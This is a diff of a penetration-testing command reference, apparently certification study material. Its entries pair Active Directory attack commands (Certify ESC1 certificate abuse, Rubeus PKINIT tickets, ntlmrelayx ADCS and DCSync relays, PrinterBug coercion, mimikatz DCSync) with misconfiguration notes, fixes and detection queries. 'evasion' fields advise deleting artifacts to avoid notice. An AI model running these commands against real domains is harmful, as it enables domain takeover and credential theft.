-        "secure_config": "# PHP — allowlist validation + store outside web root:\n$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];\n$allowed_exts  = ['jpg', 'jpeg', 'png', 'gif'];\n\n// Validate MIME type using fileinfo (server-side, not client-supplied):\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);\nif (!in_array($mime, $allowed_types)) { die('Invalid file type'); }\n\n$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\nif (!in_array($ext, $allowed_exts)) { die('Invalid extension'); }\n\n// Store OUTSIDE web root with a random name:\n$dest = '/var/uploads/' . bin2hex(random_bytes(16)) . '.' . $ext;\nmove_uploaded_file($_FILES['file']['tmp_name'], $dest);\n\n// Serve via a download script (X-Accel-Redirect or readfile()) — not directly\n\n// nginx — disable script execution in upload directory:\nlocation /uploads/ {\n    location ~* \\.php$ { deny all; }\n}",
-        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
+        "misconfiguration": "Over-privileged database accounts (application/service accounts running as sysdba/DBA). EXECUTE on UTL_FILE granted broadly (to PUBLIC). Permissive file access - legacy utl_file_dir set to '*', or DIRECTORY objects pointing at sensitive/writable locations (a web root, home or cron directories). The Oracle process running as a high-privileged OS account. TNS listener exposed to the network without valid-node checking.",
+        "vulnerable_config": "-- UTL_FILE reachable by everyone + a wide-open directory:\nGRANT EXECUTE ON SYS.UTL_FILE TO PUBLIC;\n-- legacy parameter (init.ora):\nutl_file_dir = *\n-- or a DIRECTORY object pointing at the web root, writable by a low-priv account:\nCREATE DIRECTORY web AS '/var/www/html';\nGRANT READ, WRITE ON DIRECTORY web TO app_user;",
+        "secure_config": "-- Remove broad UTL_FILE access:\nREVOKE EXECUTE ON SYS.UTL_FILE FROM PUBLIC;\n-- Drop the legacy wildcard; use scoped DIRECTORY objects instead of utl_file_dir:\nALTER SYSTEM RESET utl_file_dir SCOPE=SPFILE;\n-- Grant directory access only where required, least-privilege, never the web root:\nCREATE DIRECTORY data_load AS '/opt/oracle/import';\nGRANT READ ON DIRECTORY data_load TO app_user;   -- add WRITE only if truly needed\n-- Run Oracle as a low-privileged OS account; restrict the TNS listener (valid node checking / firewall); patch.",
+        "code_review": "Not a web-source sink - this is a DATABASE privilege/config review. RED FLAGS (Oracle):\n  GRANT EXECUTE ON UTL_FILE TO PUBLIC (or to broad app roles)\n  utl_file_dir = *   (legacy init.ora/spfile parameter)\n  CREATE DIRECTORY ... AS '<web root or writable path>' + READ/WRITE granted to non-admins\n  application accounts holding the DBA / SYSDBA role\nCHECK:  SELECT grantee,privilege FROM dba_tab_privs WHERE table_name='UTL_FILE';   SELECT * FROM dba_directories;\nSAFE:   revoke EXECUTE on UTL_FILE from PUBLIC; no utl_file_dir wildcard; scoped DIRECTORY objects; app accounts are not sysdba."
       }
     },
     {
@@ -52199,30 +52280,6 @@ const COMMAND_DATA = {
         {
           "label": "Request certificate with SAN set to Administrator",
           "command": ".\\Certify.exe request /ca:<CA_FQDN>\\<CA_NAME> /template:<TEMPLATE_NAME> /altname:Administrator"
-        },
-        {
-          "label": "Fix PEM line format before converting",
-          "command": "sed -i 's/\\s\\s\\+/\\n/g' cert.pem"
-        },
-        {
-          "label": "Convert PEM to PFX for Rubeus",
-          "command": "openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx"
-        },
-        {
-          "label": "Get TGT as Administrator using certificate (PKINIT)",
-          "command": ".\\Rubeus.exe asktgt /domain:<DOMAIN> /user:Administrator /certificate:cert.pfx /dc:<DC_FQDN> /ptt"
-        },
-        {
-          "label": "Verify injected ticket",
-          "command": "klist"
-        },
-        {
-          "label": "Check CA events for certificate issuance (run on PKI server)",
-          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4887} | Format-List"
-        },
-        {
-          "label": "List issued certificates via certutil",
-          "command": "certutil -view -restrict \"DispositionMessage=Issued\" -out RequesterName,CommonName,UPN,CertificateTemplate"
         }
       ],
       "references": [
@@ -52267,7 +52324,41 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Certificate template properties (via Certify or ADCS MMC):\n# Template: UserWebAuth\n#   Subject Name: 'Supply in the request' (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 1)\n#   EKU: Client Authentication (1.3.6.1.5.5.7.3.2)\n#   Enrollment: Domain Users (Enroll)\n# -> Any domain user can request a cert claiming UPN administrator@corp.local\n\n# Certify scan:\n# Certify.exe find /vulnerable\n# [+] ESC1: UserWebAuth  -- 'Supply in request', Domain Users Enroll, Client Auth",
         "secure_config": "# Fix CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT:\n# ADCS MMC -> Certificate Templates -> UserWebAuth -> Properties\n# Subject Name tab -> change 'Supply in the request' to\n#   'Build from this Active Directory information'\n\n# Remove broad enrollment rights:\n# Security tab -> remove 'Domain Users' -> add only the specific group that needs the cert\n\n# Enable CA Manager Approval for sensitive templates:\n# Issuance Requirements tab -> 'CA certificate manager approval' = checked\n# This requires a human review before each certificate is issued\n\n# Run Certify/PSPKIAudit quarterly to detect new vulnerable templates:\n# Invoke-PKIAudit\n\n# Enforce SID extension (Windows Server 2022+):\n# Prevents certificate from authenticating as another user even with alt SAN",
         "evasion": "Request the certificate once and use it for the TGT; delete the local .pfx/.pem after; ESC relays are noisy — trigger the coercion briefly."
-      }
+      },
+      "steps": [
+        {
+          "label": "Find vulnerable certificate templates (Certify)",
+          "command": ".\\Certify.exe find /vulnerable"
+        },
+        {
+          "label": "Request certificate with SAN set to Administrator",
+          "command": ".\\Certify.exe request /ca:<CA_FQDN>\\<CA_NAME> /template:<TEMPLATE_NAME> /altname:Administrator"
+        },
+        {
+          "label": "Fix PEM line format before converting",
+          "command": "sed -i 's/\\s\\s\\+/\\n/g' cert.pem"
+        },
+        {
+          "label": "Convert PEM to PFX for Rubeus",
+          "command": "openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx"
+        },
+        {
+          "label": "Get TGT as Administrator using certificate (PKINIT)",
+          "command": ".\\Rubeus.exe asktgt /domain:<DOMAIN> /user:Administrator /certificate:cert.pfx /dc:<DC_FQDN> /ptt"
+        },
+        {
+          "label": "Verify injected ticket",
+          "command": "klist"
+        },
+        {
+          "label": "Check CA events for certificate issuance (run on PKI server)",
+          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4887} | Format-List"
+        },
+        {
+          "label": "List issued certificates via certutil",
+          "command": "certutil -view -restrict \"DispositionMessage=Issued\" -out RequesterName,CommonName,UPN,CertificateTemplate"
+        }
+      ]
     },
     {
       "id": "cdsa-m06-pki-esc8",
@@ -52308,22 +52399,6 @@ const COMMAND_DATA = {
         {
           "label": "Coerce DC to connect to Kali via PrinterBug (Terminal 2)",
           "command": "python3 ./dementor.py <KALI_IP> <DC2_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>"
-        },
-        {
-          "label": "Get TGT as DC using relayed certificate (Rubeus PKINIT)",
-          "command": ".\\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:<BASE64_CERTIFICATE>"
-        },
-        {
-          "label": "DCSync using injected DC TGT",
-          "command": "mimikatz # lsadump::dcsync /user:Administrator /domain:<DOMAIN>"
-        },
-        {
-          "label": "Check CA server events for suspicious DomainController template requests",
-          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4887} | Where-Object { $_.Message -match 'DomainController' } | Format-List"
-        },
-        {
-          "label": "Disable ADCS web enrollment HTTP on IIS",
-          "command": "Import-Module WebAdministration; Set-WebBinding -Name 'Default Web Site' -Protocol 'http' -Action 'Delete'"
         }
       ],
       "references": [
@@ -52374,7 +52449,33 @@ const COMMAND_DATA = {
         "vulnerable_config": "# ADCS web enrollment without EPA or HTTPS:\n# URL reachable: http://CA01/certsrv/  (no HTTPS redirect)\n# EPA (Extended Protection for Authentication) = NOT configured\n\n# IIS applicationHost.config (vulnerable):\n# <security><authentication><windowsAuthentication>\n#   <extendedProtection tokenChecking=\"None\" />\n# </windowsAuthentication></authentication></security>\n\n# MS-EFSRPC coercion: unauthenticated (pre-patch) or low-priv user can call:\n# EfsRpcOpenFileRaw(\\\\attacker@443\\share) -> DC authenticates outbound",
         "secure_config": "# Fix 1 — Enable EPA on ADCS web enrollment (IIS):\n# IIS Manager -> certsrv site -> Authentication -> Windows Auth -> Providers\n# Set Extended Protection to 'Required'\n# OR via command:\nImport-Module WebAdministration\nSet-WebConfigurationProperty -Filter '//security/authentication/windowsAuthentication' \\\n    -Name extendedProtection -Value @{tokenChecking='Require'} -PSPath 'IIS:\\\\' -Location 'Default Web Site/certsrv'\n\n# Fix 2 — Enable HTTPS only on certsrv:\nNew-WebBinding -Name 'Default Web Site' -Protocol https -Port 443\n# Redirect HTTP to HTTPS\n\n# Fix 3 — Patch MS-EFSRPC: KB5005413 (Aug 2021)\n# Fix 4 — Enable SMB signing on all hosts (blocks NTLM relay)\n# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled",
         "evasion": "Request the certificate once and use it for the TGT; delete the local .pfx/.pem after; ESC relays are noisy — trigger the coercion briefly."
-      }
+      },
+      "steps": [
+        {
+          "label": "Start NTLMRelayx targeting ADCS web enrollment (Terminal 1)",
+          "command": "impacket-ntlmrelayx -t http://<PKI_IP>/certsrv/default.asp --template DomainController -smb2support --adcs"
+        },
+        {
+          "label": "Coerce DC to connect to Kali via PrinterBug (Terminal 2)",
+          "command": "python3 ./dementor.py <KALI_IP> <DC2_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>"
+        },
+        {
+          "label": "Get TGT as DC using relayed certificate (Rubeus PKINIT)",
+          "command": ".\\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:<BASE64_CERTIFICATE>"
+        },
+        {
+          "label": "DCSync using injected DC TGT",
+          "command": "mimikatz # lsadump::dcsync /user:Administrator /domain:<DOMAIN>"
+        },
+        {
+          "label": "Check CA server events for suspicious DomainController template requests",
+          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4887} | Where-Object { $_.Message -match 'DomainController' } | Format-List"
+        },
+        {
+          "label": "Disable ADCS web enrollment HTTP on IIS",
+          "command": "Import-Module WebAdministration; Set-WebBinding -Name 'Default Web Site' -Protocol 'http' -Action 'Delete'"
+        }
+      ]
     },
     {
       "id": "ptc-gettgt",
@@ -56349,18 +56450,6 @@ const COMMAND_DATA = {
         {
           "label": "Trigger PrinterBug — coerce DC1 to connect to Kali (Terminal 2)",
           "command": "python3 ./dementor.py <KALI_IP> <DC1_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>"
-        },
-        {
-          "label": "Disable Print Spooler remote RPC endpoint via registry",
-          "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\" /v RegisterSpoolerRemoteRpcEndPoint /t REG_DWORD /d 2 /f"
-        },
-        {
-          "label": "Check Print Spooler service status",
-          "command": "Get-Service -Name Spooler | Select Status, StartType"
-        },
-        {
-          "label": "Disable Print Spooler service",
-          "command": "Stop-Service -Name Spooler; Set-Service -Name Spooler -StartupType Disabled"
         }
       ],
       "references": [
@@ -56402,7 +56491,29 @@ const COMMAND_DATA = {
         "misconfiguration": "The Windows Print Spooler service (spoolsv.exe) is enabled on non-print-server machines and exposes MS-RPRN (RpcRemoteFindFirstPrinterChangeNotification). Any authenticated user can coerce the DC or any host running Spooler to authenticate outbound to an attacker-controlled machine via this RPC call. Combined with NTLM relay to LDAP/LDAPS, this grants write access to AD — including adding Shadow Credentials or changing msDS-AllowedToDelegateTo for privilege escalation.",
         "vulnerable_config": "# Print Spooler running on DC (the critical enabler):\nGet-Service Spooler -ComputerName dc01\n# Status: Running  StartType: Automatic\n\n# LDAP relay possible because LDAP signing not enforced:\n# ldapdomainrelay (impacket-ntlmrelayx -t ldap://dc01)\n# DC authenticates to attacker -> attacker relays to DC's LDAP -> writes Shadow Credentials\n\n# LDAPS + channel binding NOT enforced (default):\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\n#   LdapEnforceChannelBinding = 0  (not enforced)",
         "secure_config": "# Fix 1 — Disable Print Spooler on all DCs and non-print-servers:\nStop-Service Spooler; Set-Service Spooler -StartupType Disabled\n# GPO: Computer Config > System Services > Print Spooler = Disabled\n\n# Fix 2 — Block remote Spooler access while keeping local printing:\n# GPO: Computer Config > Admin Templates > Printers\n#   'Allow Print Spooler to accept client connections' = Disabled\n\n# Fix 3 — Enforce LDAP signing + channel binding:\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters' \\\n    -Name 'LdapEnforceChannelBinding' -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters' \\\n    -Name 'LDAPServerIntegrity' -Value 2\n# These block NTLM relay to LDAP/LDAPS even if coercion succeeds\n\n# Fix 4 — Apply PrintNightmare patches: KB5004945, KB5005033"
-      }
+      },
+      "steps": [
+        {
+          "label": "Start NTLMRelayx targeting DC2 for DCSync (Terminal 1)",
+          "command": "impacket-ntlmrelayx -t dcsync://<DC2_IP> -smb2support"
+        },
+        {
+          "label": "Trigger PrinterBug — coerce DC1 to connect to Kali (Terminal 2)",
+          "command": "python3 ./dementor.py <KALI_IP> <DC1_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>"
+        },
+        {
+          "label": "Disable Print Spooler remote RPC endpoint via registry",
+          "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\" /v RegisterSpoolerRemoteRpcEndPoint /t REG_DWORD /d 2 /f"
+        },
+        {
+          "label": "Check Print Spooler service status",
+          "command": "Get-Service -Name Spooler | Select Status, StartType"
+        },
+        {
+          "label": "Disable Print Spooler service",
+          "command": "Stop-Service -Name Spooler; Set-Service -Name Spooler -StartupType Disabled"
+        }
+      ]
     },
     {
       "type": "command",
@@ -90447,7 +90558,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 908,
-  "buildDate": "2026-09-02T03:51:31.214Z",
+  "buildDate": "2026-09-02T10:20:40.494Z",
   "certifications": [
     "CDSA",
     "CPTS",
